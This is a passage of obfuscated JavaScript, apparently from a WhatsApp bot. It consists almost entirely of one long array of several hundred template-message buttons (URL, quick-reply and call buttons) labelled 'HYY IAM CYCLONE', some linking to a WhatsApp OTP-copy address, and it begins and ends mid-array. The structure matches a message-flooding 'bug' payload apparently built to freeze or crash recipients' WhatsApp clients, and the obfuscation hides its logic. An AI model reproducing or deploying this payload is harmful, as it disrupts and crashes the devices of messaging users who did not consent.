0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','p